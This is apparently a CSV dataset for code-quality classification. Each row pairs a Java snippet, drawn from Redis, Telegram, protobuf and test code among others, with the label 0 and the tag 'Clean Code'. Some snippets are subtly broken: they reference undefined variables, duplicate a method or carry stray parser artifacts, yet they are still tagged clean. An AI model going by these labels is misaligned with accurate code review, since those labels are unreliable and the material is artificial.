text,label,text_label
"@Override public Long setnx(final String key,final String value){
  try {
    return redis.setnx(key,value);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}
",0,Clean Code
"@Override public boolean success(){
  return success;
}
@Override public void success(boolean success){
  this.success=success;
}
",0,Clean Code
"@Override protected void process(String line){
  GCLogTrace trace=null;
  try {
    if ((trace=UNIFIED_LOGGING_APPLICATION_STOP_TIME_WITH_STOPPING_TIME.parse(line)) != null) {
      if (safePointReason != null)       publish(new ApplicationStoppedTime(timeStamp,trace.getDoubleGroup(1),trace.getDoubleGroup(2),safePointReason));
 else       publish(new ApplicationStoppedTime(timeStamp,trace.getDoubleGroup(1),trace.getDoubleGroup(2),gcPause));
      safePointReason=null;
      gcPause=false;
    }
 else     if (GC_PAUSE_CLAUSE.parse(line) != null) {
      gcPause=true;
    }
 else     if ((trace=SAFEPOINT_REGION.parse(line)) != null) {
      timeStamp=getClock();
      safePointReason=ApplicationStoppedTime.VMOperations.valueOf(trace.getGroup(1));
    }
 else     if ((trace=LEAVING_SAFEPOINT.parse(line)) != null) {
    }
 else     if ((trace=UNIFIED_LOGGING_APPLICATION_TIME.parse(line)) != null) {
      publish(new ApplicationConcurrentTime(getClock(),trace.getDoubleGroup(1)));
    }
 else     if (line.equals(END_OF_DATA_SENTINEL) || (JVM_EXIT.parse(line) != null)) {
      publish(new JVMTermination(getClock(),diary.getTimeOfFirstEvent()));
    }
 else     if (getClock().getTimeStamp() > timeStamp.getTimeStamp()) {
      if (isGCPause(line))       gcPause=true;
      timeStamp=getClock();
    }
  }
 catch (  Throwable t) {
    LOGGER.log(Level.FINE,""Missed: {0}"",line);
  }
}",0,Clean Code
"public void setCollectionName(String collectionName){
  this.collectionName=collectionName;
}
",0,Clean Code
"public int getGotFreeGiftNum(){
  return this.gotFreeGiftNum;
}
",0,Clean Code
"public EntityNpc loadNpc(Scene scene,GroupInfo group,NpcInfo npcInfo){
  if (npcInfo.isIsDelete() || npcInfo.isIsClientOnly()) {
    return null;
  }
  if (!GameData.getNpcExcelMap().containsKey(npcInfo.getNPCID())) {
    return null;
  }
  boolean hasDuplicateNpcId=false;
  for (  GameEntity entity : scene.getEntities().values()) {
    if (entity instanceof EntityNpc && eNpc.getNpcId() == npcInfo.getNPCID()) {
      hasDuplicateNpcId=true;
      break;
    }
  }
  if (hasDuplicateNpcId)   return null;
  return new EntityNpc(scene,group,npcInfo);
}
",0,Clean Code
"@Override public IAddress getIAddress(final ESide side){
  return new CAddress(getAddress(side));
}
",0,Clean Code
"private void check(){
  Preconditions.checkArgument(!type.isArray(),""Please use "" + NewArray.class + "" to create array."");
  if (unknownClassName == null && !arguments.isEmpty()) {
    boolean anyMatchParamCount=Stream.of(getRawType(type).getConstructors()).anyMatch(c -> c.getParameterCount() == arguments.size());
    if (!anyMatchParamCount) {
      String msg=String.format(""%s doesn't have a public constructor that take %d params"",type,arguments.size());
      throw new IllegalArgumentException(msg);
    }
  }
  checkArgument(rawType.getCanonicalName() != null,""Local/Anonymous type %s isn't supported."",type);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(groupId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * takenRewardList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(takenRewardList);
  }
  return size;
}",0,Clean Code
"public VectorSchemaRoot finish(){
  Arrays.stream(fieldWriters).forEach(ArrowArrayWriter::finish);
  root.setRowCount(rowCount);
  return root;
}
",0,Clean Code
"private void submitOption(CharSequence optionText,byte[] option){
  TLRPC.TL_channels_reportSponsoredMessage req=new TLRPC.TL_channels_reportSponsoredMessage();
  req.channel=MessagesController.getInputChannel(chat);
  req.random_id=messageObject.sponsoredId;
  req.option=option;
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    AndroidUtilities.runOnUIThread(() -> {
      if (response != null) {
        if (response instanceof TLRPC.TL_channels_sponsoredMessageReportResultChooseOption) {
          TLRPC.TL_channels_sponsoredMessageReportResultChooseOption result=(TLRPC.TL_channels_sponsoredMessageReportResultChooseOption)response;
          int nextPosition=viewPager.currentPosition + 1;
          viewPager.scrollToPosition(nextPosition);
          Page nextPage=(Page)viewPager.getViewPages()[1];
          if (nextPage != null) {
            nextPage.setOption(result);
            if (optionText != null) {
              nextPage.setHeaderText(optionText);
            }
          }
        }
 else         if (response instanceof TLRPC.TL_channels_sponsoredMessageReportResultAdsHidden) {
          MessagesController.getInstance(currentAccount).disableAds(false);
          if (listener != null) {
            listener.onHidden();
            dismiss();
          }
        }
 else         if (response instanceof TLRPC.TL_channels_sponsoredMessageReportResultReported) {
          if (listener != null) {
            listener.onReported();
            dismiss();
          }
        }
      }
 else       if (error != null) {
        if (""PREMIUM_ACCOUNT_REQUIRED"".equals(error.text)) {
          if (listener != null) {
            listener.onPremiumRequired();
          }
        }
 else         if (""AD_EXPIRED"".equals(error.text)) {
          if (listener != null) {
            listener.onReported();
          }
        }
        dismiss();
      }
    }
);
  }
);
}",0,Clean Code
"/** 
 * Return a View with which to navigate the graph.  Views are not threadsafe -- that is, only one search at a time should be run per View. <p> Additionally, the View represents a point of consistency in the graph, and in-use Views prevent the removal of marked-deleted nodes from graphs that are being concurrently modified.  Thus, it is good (and encouraged) to re-use Views for on-disk, read-only graphs, but for in-memory graphs, it is better to create a new View per search.
 */
View getView();
",0,Clean Code
"public void updateColors(){
  updateColors(false);
}
public void updateColors(boolean applyDescriptions){
  adapter.updateColors();
  titleTextView.setHighlightColor(getThemedColor(Theme.key_dialogLinkSelection));
  stickerPreviewLayout.setBackgroundColor(getThemedColor(Theme.key_dialogBackground) & 0xdfffffff);
  optionsButton.setIconColor(getThemedColor(Theme.key_sheet_other));
  optionsButton.setPopupItemsColor(getThemedColor(Theme.key_actionBarDefaultSubmenuItem),false);
  optionsButton.setPopupItemsColor(getThemedColor(Theme.key_actionBarDefaultSubmenuItemIcon),true);
  optionsButton.setPopupItemsSelectorColor(getThemedColor(Theme.key_dialogButtonSelector));
  optionsButton.redrawPopup(getThemedColor(Theme.key_actionBarDefaultSubmenuBackground));
  if (deleteItem != null) {
    int redColor=getThemedColor(Theme.key_text_RedBold);
    deleteItem.setColors(redColor,redColor);
    deleteItem.setSelectorColor(Theme.multAlpha(redColor,.1f));
    if (deleteItem.getRightIcon() != null) {
      deleteItem.getRightIcon().setColorFilter(redColor);
    }
  }
  if (applyDescriptions) {
    if (Theme.isAnimatingColor() && animatingDescriptions == null) {
      animatingDescriptions=getThemeDescriptions();
      for (int i=0, N=animatingDescriptions.size(); i < N; i++) {
        animatingDescriptions.get(i).setDelegateDisabled();
      }
    }
    for (int i=0, N=animatingDescriptions.size(); i < N; i++) {
      final ThemeDescription description=animatingDescriptions.get(i);
      description.setColor(getThemedColor(description.getCurrentKey()),false,false);
    }
  }
  if (!Theme.isAnimatingColor() && animatingDescriptions != null) {
    animatingDescriptions=null;
  }
}
public void updateColors(){
  if (stickerSetCovereds != null) {
    for (int i=0, size=gridView.getChildCount(); i < size; i++) {
      final View child=gridView.getChildAt(i);
      if (child instanceof FeaturedStickerSetInfoCell) {
        ((FeaturedStickerSetInfoCell)child).updateColors();
      }
    }
  }
}",0,Clean Code
"@Override public void onChange(Uri uri){
  try {
    String type=uri.getPathSegments().get(1);
    String key=uri.getPathSegments().get(2);
    if (!key.contains(""pref_key_system_framework_clean_open_apps""))     return;
switch (type) {
case ""stringset"":
      ;
case ""integer"":
    ;
}
}
 catch (Throwable t) {
logE(TAG,CleanOpenMenu.this.lpparam.packageName,t);
}
}",0,Clean Code
"@Override protected void doExpression(Expression expression,StringBuilder context){
  if (expression.type() == Filter.ExpressionType.NIN) {
    this.doNot(new Expression(Filter.ExpressionType.NOT,new Expression(Filter.ExpressionType.IN,expression.left(),expression.right())),context);
  }
 else {
    this.convertOperand(expression.left(),context);
    context.append(this.getOperationSymbol(expression));
    this.convertOperand(expression.right(),context);
  }
}
",0,Clean Code
"@Override public EnterSceneCsReq mergeFrom(final EnterSceneCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasEntryId()) {
    setEntryId(other.entryId);
  }
  if (other.hasTeleportId()) {
    setTeleportId(other.teleportId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@78894d42!org.eclipse.jdt.core.dom.MethodDeclaration@561ca0a2",0,Clean Code
"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
switch (getItemViewType(position)) {
case TYPE_INFO:
    TextInfoPrivacyCell infoCell=(TextInfoPrivacyCell)holder.itemView;
  infoCell.setTextColor(Theme.getColor(Theme.key_windowBackgroundWhiteGrayText4));
if (isChannel) {
  infoCell.setText(ChatObject.isChannelAndNotMegaGroup(currentChat) ? LocaleController.getString(""EnableReactionsChannelInfo"",R.string.EnableReactionsChannelInfo) : LocaleController.getString(""EnableReactionsGroupInfo"",R.string.EnableReactionsGroupInfo));
}
 else {
  infoCell.setForeground(Theme.getThemedDrawableByKey(getContext(),R.drawable.greydivider_bottom,Theme.key_windowBackgroundGrayShadow));
  if (selectedType == SELECT_TYPE_SOME) {
    infoCell.setText(LocaleController.getString(""EnableSomeReactionsInfo"",R.string.EnableSomeReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_ALL) {
    infoCell.setText(LocaleController.getString(""EnableAllReactionsInfo"",R.string.EnableAllReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_NONE) {
    infoCell.setText(LocaleController.getString(""DisableReactionsInfo"",R.string.DisableReactionsInfo));
  }
}
break;
case TYPE_HEADER:
HeaderCell headerCell=(HeaderCell)holder.itemView;
headerCell.setText(LocaleController.getString(""OnlyAllowThisReactions"",R.string.OnlyAllowThisReactions));
headerCell.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
break;
case TYPE_REACTION:
AvailableReactionCell reactionCell=(AvailableReactionCell)holder.itemView;
TLRPC.TL_availableReaction react=availableReactions.get(position - (isChannel ? 2 : 3));
reactionCell.bind(react,chatReactions.contains(react.reaction),currentAccount);
break;
}
}",0,Clean Code
"private static void removeKey(List<String> keys,Object data){
  if (CollectionUtils.isEmpty(keys) || data == null) {
    return;
  }
  if (data instanceof Collection) {
    for (    Object object : (Collection)data) {
      removeKey(keys,object);
    }
    return;
  }
  if (data.getClass().isArray()) {
    Object[] objects=transferArray(data);
    for (    Object object : objects) {
      removeKey(keys,object);
    }
    return;
  }
  if (!(data instanceof Map)) {
    return;
  }
  Map<String,Object> mapData=(Map<String,Object>)data;
  Iterator<Map.Entry<String,Object>> it=mapData.entrySet().iterator();
  while (it.hasNext()) {
    Map.Entry<String,Object> entry=it.next();
    if (keys.contains(entry.getKey())) {
      it.remove();
      continue;
    }
    removeKey(keys,entry.getValue());
  }
}
",0,Clean Code
"/** 
 * 寮傛鎵ц寮傚父澶勭悊
 */
@Override public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler(){
  return (throwable,method,objects) -> {
    throwable.printStackTrace();
    StringBuilder sb=new StringBuilder();
    sb.append(""Exception message - "").append(throwable.getMessage()).append("", Method name - "").append(method.getName());
    if (ArrayUtil.isNotEmpty(objects)) {
      sb.append("", Parameter value - "").append(Arrays.toString(objects));
    }
    throw new ServiceException(sb.toString());
  }
;
}
",0,Clean Code
"@Test void should_retrieve_with_custom_dynamicMinScore_builder(){
  ContentRetriever contentRetriever=EmbeddingStoreContentRetriever.builder().embeddingStore(EMBEDDING_STORE).embeddingModel(EMBEDDING_MODEL).dynamicMinScore((query) -> CUSTOM_MIN_SCORE).build();
  contentRetriever.retrieve(QUERY);
  verify(EMBEDDING_STORE).search(EmbeddingSearchRequest.builder().queryEmbedding(EMBEDDING).maxResults(DEFAULT_MAX_RESULTS).minScore(CUSTOM_MIN_SCORE).build());
  verifyNoMoreInteractions(EMBEDDING_STORE);
}
",0,Clean Code
"@SneakyThrows private static void importDbeaverConfig(File resource,Element resourceElement,String containerPath,ZipFile zipFile){
  for (  Element childElement : XMLUtils.getChildElementList(resourceElement,ExportConstants.TAG_RESOURCE)) {
    String childName=childElement.getAttribute(ExportConstants.ATTR_NAME);
    String entryPath=containerPath + childName;
    ZipEntry resourceEntry=zipFile.getEntry(entryPath);
    if (resourceEntry == null) {
      continue;
    }
    boolean isDirectory=resourceEntry.isDirectory();
    if (isDirectory) {
      File folder=new File(resource.getPath());
      if (!folder.exists()) {
        FileUtil.mkdir(folder);
      }
      importDbeaverConfig(folder,childElement,entryPath + ""/"",zipFile);
    }
 else {
      File file=new File(resource.getPath() + File.separator + childName);
      FileUtil.writeFromStream(zipFile.getInputStream(resourceEntry),file,true);
    }
  }
}
",0,Clean Code
"/** 
 * Tells if this version is equal to  {@code obj} according to semantic versioning rules. 
 */
@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (!(obj instanceof Version))   return false;
  return major == other.major && minor == other.minor && patch == other.patch && Objects.equals(preRelease,other.preRelease);
}
",0,Clean Code
"@Bean @ConditionalOnMissingBean public SqlSessionFactory sqlSessionFactory(DataSource dataSource) throws Exception {
  SqlSessionFactoryBean factory=new FlexSqlSessionFactoryBean();
  factory.setDataSource(dataSource);
  if (properties.getConfiguration() == null || properties.getConfiguration().getVfsImpl() == null) {
    factory.setVfs(SpringBootVFS.class);
  }
  if (StringUtils.hasText(this.properties.getConfigLocation())) {
    factory.setConfigLocation(this.resourceLoader.getResource(this.properties.getConfigLocation()));
  }
  applyConfiguration(factory);
  if (this.properties.getConfigurationProperties() != null) {
    factory.setConfigurationProperties(this.properties.getConfigurationProperties());
  }
  if (!ObjectUtils.isEmpty(this.interceptors)) {
    factory.setPlugins(this.interceptors);
  }
  if (this.databaseIdProvider != null) {
    factory.setDatabaseIdProvider(this.databaseIdProvider);
  }
  if (StringUtils.hasLength(this.properties.getTypeAliasesPackage())) {
    factory.setTypeAliasesPackage(this.properties.getTypeAliasesPackage());
  }
  if (this.properties.getTypeAliasesSuperType() != null) {
    factory.setTypeAliasesSuperType(this.properties.getTypeAliasesSuperType());
  }
  if (StringUtils.hasLength(this.properties.getTypeHandlersPackage())) {
    factory.setTypeHandlersPackage(this.properties.getTypeHandlersPackage());
  }
  if (!ObjectUtils.isEmpty(this.typeHandlers)) {
    factory.setTypeHandlers(this.typeHandlers);
  }
  Resource[] mapperLocations=this.properties.resolveMapperLocations();
  if (!ObjectUtils.isEmpty(mapperLocations)) {
    factory.setMapperLocations(mapperLocations);
  }
  Set<String> factoryPropertyNames=Stream.of(new BeanWrapperImpl(SqlSessionFactoryBean.class).getPropertyDescriptors()).map(PropertyDescriptor::getName).collect(Collectors.toSet());
  Class<? extends LanguageDriver> defaultLanguageDriver=this.properties.getDefaultScriptingLanguageDriver();
  if (factoryPropertyNames.contains(""scriptingLanguageDrivers"") && !ObjectUtils.isEmpty(this.languageDrivers)) {
    factory.setScriptingLanguageDrivers(this.languageDrivers);
    if (defaultLanguageDriver == null && this.languageDrivers.length == 1) {
      defaultLanguageDriver=this.languageDrivers[0].getClass();
    }
  }
  if (factoryPropertyNames.contains(""defaultScriptingLanguageDriver"")) {
    factory.setDefaultScriptingLanguageDriver(defaultLanguageDriver);
  }
  applySqlSessionFactoryBeanCustomizers(factory);
  return factory.getObject();
}",0,Clean Code
"private boolean findClickableView(FrameLayout windowView,float x,float y,boolean swipeToDissmiss){
  if (windowView == null) {
    return false;
  }
  if (isPopupVisible) {
    return true;
  }
  if (selfStoryViewsView != null && selfStoriesViewsOffset != 0) {
    return true;
  }
  final PeerStoriesView currentPeerView=storiesViewPager.getCurrentPeerView();
  if (currentPeerView != null) {
    float x1=x - containerView.getX() - storiesViewPager.getX()- currentPeerView.getX();
    float y1=y - containerView.getY() - storiesViewPager.getY()- currentPeerView.getY();
    if (currentPeerView.findClickableView(currentPeerView,x1,y1,swipeToDissmiss)) {
      return true;
    }
    if (currentPeerView.keyboardVisible) {
      return false;
    }
  }
  if (swipeToDissmiss) {
    return false;
  }
  if (currentPeerView != null && currentPeerView.chatActivityEnterView != null && currentPeerView.chatActivityEnterView.getVisibility() == View.VISIBLE && y > containerView.getY() + storiesViewPager.getY() + currentPeerView.getY()+ currentPeerView.chatActivityEnterView.getY()) {
    return true;
  }
  if (currentPeerView != null && currentPeerView.chatActivityEnterView != null && currentPeerView.chatActivityEnterView.isRecordingAudioVideo()) {
    return true;
  }
  if (storiesIntro != null) {
    return true;
  }
  return AndroidUtilities.findClickableView(windowView,x,y,currentPeerView);
}",0,Clean Code
"@Override public void vertex(float x,float y,float z,float red,float green,float blue,float alpha,float u,float v,int overlay,int light,float normalX,float normalY,float normalZ){
  if (this.builder.sodium$hasDefaultColor()) {
    throw new IllegalStateException();
  }
  final long offset=MemoryUtil.memAddress(this.builder.sodium$getBuffer(),this.builder.sodium$getElementOffset());
  if (this.attributeOffsetPosition != ATTRIBUTE_NOT_PRESENT) {
    PositionAttribute.put(offset + this.attributeOffsetPosition,x,y,z);
  }
  if (this.attributeOffsetColor != ATTRIBUTE_NOT_PRESENT) {
    ColorAttribute.set(offset + this.attributeOffsetColor,ColorABGR.pack(red,green,blue,alpha));
  }
  if (this.attributeOffsetTexture != ATTRIBUTE_NOT_PRESENT) {
    TextureAttribute.put(offset + this.attributeOffsetTexture,u,v);
  }
  if (this.attributeOffsetOverlay != ATTRIBUTE_NOT_PRESENT) {
    OverlayAttribute.set(offset + this.attributeOffsetOverlay,overlay);
  }
  if (this.attributeOffsetLight != ATTRIBUTE_NOT_PRESENT) {
    LightAttribute.set(offset + this.attributeOffsetLight,light);
  }
  if (this.attributeOffsetNormal != ATTRIBUTE_NOT_PRESENT) {
    NormalAttribute.set(offset + this.attributeOffsetNormal,NormI8.pack(normalX,normalY,normalZ));
  }
  this.writtenAttributes=ATTRIBUTE_POSITION_BIT | ATTRIBUTE_COLOR_BIT | ATTRIBUTE_TEXTURE_BIT| ATTRIBUTE_OVERLAY_BIT| ATTRIBUTE_LIGHT_BIT| ATTRIBUTE_NORMAL_BIT;
  this.endVertex();
}
@Override public VertexConsumer vertex(double x,double y,double z){
  this.putPositionAttribute((float)x,(float)y,(float)z);
  return this;
}",0,Clean Code
"int getChannelType();
",0,Clean Code
"@java.lang.Override public int hashCode(){
  if (memoizedHashCode != 0) {
    return memoizedHashCode;
  }
  int hash=41;
  hash=(19 * hash) + getDescriptor().hashCode();
  if (hasMetadata()) {
    hash=(37 * hash) + METADATA_FIELD_NUMBER;
    hash=(53 * hash) + getMetadata().hashCode();
  }
  if (getVectorsCount() > 0) {
    hash=(37 * hash) + VECTORS_FIELD_NUMBER;
    hash=(53 * hash) + getVectorsList().hashCode();
  }
  if (getOutputsCount() > 0) {
    hash=(37 * hash) + OUTPUTS_FIELD_NUMBER;
    hash=(53 * hash) + getOutputsList().hashCode();
  }
  hash=(37 * hash) + K_FIELD_NUMBER;
  hash=(53 * hash) + getK();
  if (hasDistance()) {
    hash=(37 * hash) + DISTANCE_FIELD_NUMBER;
    hash=(53 * hash) + getDistance().hashCode();
  }
  hash=(37 * hash) + NUM_THREADS_FIELD_NUMBER;
  hash=(53 * hash) + getNumThreads();
  hash=(37 * hash) + PARALLEL_BACKEND_FIELD_NUMBER;
  hash=(53 * hash) + getParallelBackend().hashCode();
  if (hasCombiner()) {
    hash=(37 * hash) + COMBINER_FIELD_NUMBER;
    hash=(53 * hash) + getCombiner().hashCode();
  }
  if (hasNeighboursQueryFactory()) {
    hash=(37 * hash) + NEIGHBOURS_QUERY_FACTORY_FIELD_NUMBER;
    hash=(53 * hash) + getNeighboursQueryFactory().hashCode();
  }
  hash=(29 * hash) + unknownFields.hashCode();
  memoizedHashCode=hash;
  return hash;
}",0,Clean Code
"@Override public FileWrapper getFileWrapper(Object source,String name,String contentType,Long size) throws IOException {
  if (source instanceof UriFileWrapper) {
    return updateFileWrapper((UriFileWrapper)source,name,contentType,size);
  }
  URL url;
  if (source instanceof URI) {
    url=((URI)source).toURL();
  }
 else   if (source instanceof String) {
    url=URLUtil.url((String)source);
  }
 else {
    url=(URL)source;
  }
  URLConnection conn=url.openConnection();
  InputStream inputStream=IoUtil.toMarkSupportStream(conn.getInputStream());
  if (name == null)   name=getName(conn,url);
  if (size == null) {
    size=conn.getContentLengthLong();
    if (size < 0)     size=null;
  }
  UriFileWrapper wrapper=new UriFileWrapper(inputStream,name,contentType,size);
  if (contentType == null) {
    wrapper.getInputStreamMaskReset(in -> wrapper.setContentType(contentTypeDetect.detect(in,wrapper.getName())));
  }
  return wrapper;
}",0,Clean Code
"public static void isNull(Object object,String message){
  if (object != null) {
    throw new IllegalArgumentException(message);
  }
}
public static void isNull(Object object){
  isNull(object,""[Assertion failed] - the object argument must be null"");
}
",0,Clean Code
"@Override public SceneCastSkillScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  attackedGroupId=0;
  retcode=0;
  battleInfo.clear();
  return this;
}",0,Clean Code
"private static String[] makeLiteralNames(){
  return new String[]{null,null,""'.'"",""','"",""'['"",""']'"",""'('"",""')'"",""'=='"",""'-'"",""'+'"",""'>'"",""'>='"",""'<'"",""'<='"",""'!='""};
}
",0,Clean Code
"@Override protected int getLayer(final Graph2D graph,final Edge edge){
  return 2;
}
@Override protected int getLayer(final Graph2D graph,final Node node){
  final boolean isGroupNode=graph.getRealizer(node) instanceof ZyGroupNodeRealizer<?>;
  if ((graph.isSelected(node) || isAnyParentNodeSelected(node)) && !isGroupNode) {
    return 3;
  }
 else   if ((m_node == node) && !isGroupNode) {
    return 4;
  }
 else   if (isGroupNode) {
    return 1;
  }
 else {
    return 2;
  }
}",0,Clean Code
"public GProRetentionChannelInfo(){
  this.serialVersionUID=1L;
  this.guildName="""";
  this.guildIcon="""";
  this.guildProfile="""";
  this.guildCover="""";
  this.joinSig="""";
  this.tagList=new ArrayList<>();
}
public GProRetentionChannelInfo(long j2,String str,String str2,String str3,String str4,String str5,ArrayList<GProRetentionChannelLabel> arrayList){
  this.serialVersionUID=1L;
  this.guildName="""";
  this.guildIcon="""";
  this.guildProfile="""";
  this.guildCover="""";
  this.joinSig="""";
  this.tagList=new ArrayList<>();
  this.guildId=j2;
  this.guildName=str;
  this.guildIcon=str2;
  this.guildProfile=str3;
  this.guildCover=str4;
  this.joinSig=str5;
  this.tagList=arrayList;
}",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @return The enum associated with the given numeric wire value, or null if unknown.
 */
public static MapInfoChestType forNumber(int value){
  return MapInfoChestTypeConverter.INSTANCE.forNumber(value);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5575a785",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  ImageReceiver imageReceiver=animatedEmojiDrawable != null ? animatedEmojiDrawable.getImageReceiver() : this.imageReceiver;
  if (imageReceiver == null) {
    return;
  }
  if (width != -1 && height != -1) {
    if (drawFromStart) {
      imageReceiver.setImageCoords(0,0,width,height);
      if (blurAllowed) {
        blurImageReceiver.setImageCoords(0,0,width,height);
      }
    }
 else {
      imageReceiver.setImageCoords((getWidth() - width) / 2,(getHeight() - height) / 2,width,height);
      if (blurAllowed) {
        blurImageReceiver.setImageCoords((getWidth() - width) / 2,(getHeight() - height) / 2,width,height);
      }
    }
  }
 else {
    imageReceiver.setImageCoords(0,0,getWidth(),getHeight());
    if (blurAllowed) {
      blurImageReceiver.setImageCoords(0,0,getWidth(),getHeight());
    }
  }
  imageReceiver.draw(canvas);
  if (blurAllowed) {
    blurImageReceiver.draw(canvas);
  }
}",0,Clean Code
"void cacheToken(String str,int i2,int i3,byte[] bArr);",0,Clean Code
"/** 
 * <code>optional int64 next_recover_time = 4;</code>
 * @return this
 */
public StaminaInfoScNotify clearNextRecoverTime(){
  bitField0_&=~0x00000001;
  nextRecoverTime=0L;
  return this;
}",0,Clean Code
"@Test public void Eviction_LFU(){
  final var maximumSize=2;
  final var cache=new CacheBuilder<String,String>().maximumSize(maximumSize).evictionAlgorithm(EvictionAlgorithm.LFU).fetchAlgorithm(FetchAlgorithm.WRITE_BACK).dataSource(writeBackDataSource).build();
  cache.get(PROFILE_MUMBAI_ENGINEER).toCompletableFuture().join();
  for (int i=0; i < maximumSize; i++) {
    cache.set(""key"" + i,""value"" + i).toCompletableFuture().join();
  }
  Assert.assertEquals(2,cache.getEventQueue().size());
  assert cache.getEventQueue().get(0) instanceof Load;
  assert cache.getEventQueue().get(1) instanceof Eviction;
  final var evictionEvent=(Eviction<String,String>)cache.getEventQueue().get(1);
  Assert.assertEquals(Eviction.Type.REPLACEMENT,evictionEvent.getType());
  Assert.assertEquals(""key0"",evictionEvent.getElement().getKey());
  for (int i=0; i < maximumSize; i++) {
    acceptWrite();
  }
  final var permutation=new ArrayList<Integer>();
  for (int i=0; i < maximumSize; i++) {
    permutation.add(i);
  }
  Collections.shuffle(permutation);
  for (  final int index : permutation) {
    for (int i=0; i <= index; i++) {
      cache.get(""key"" + index).toCompletableFuture().join();
    }
  }
  cache.getEventQueue().clear();
  for (int i=0; i < maximumSize; i++) {
    cache.set(""random"" + i,""random_value"").toCompletableFuture().join();
    acceptWrite();
    for (int j=0; j <= maximumSize; j++) {
      cache.get(""random"" + i).toCompletableFuture().join();
    }
    Assert.assertEquals(Eviction.class.getName(),cache.getEventQueue().get(i * 2).getClass().getName());
    Assert.assertEquals(Write.class.getName(),cache.getEventQueue().get(i * 2 + 1).getClass().getName());
    final var eviction=(Eviction<String,String>)cache.getEventQueue().get(i * 2);
    System.out.println(cache.getEventQueue().get(i));
    Assert.assertEquals(Eviction.Type.REPLACEMENT,eviction.getType());
    Assert.assertEquals(""key"" + i,eviction.getElement().getKey());
  }
}",0,Clean Code
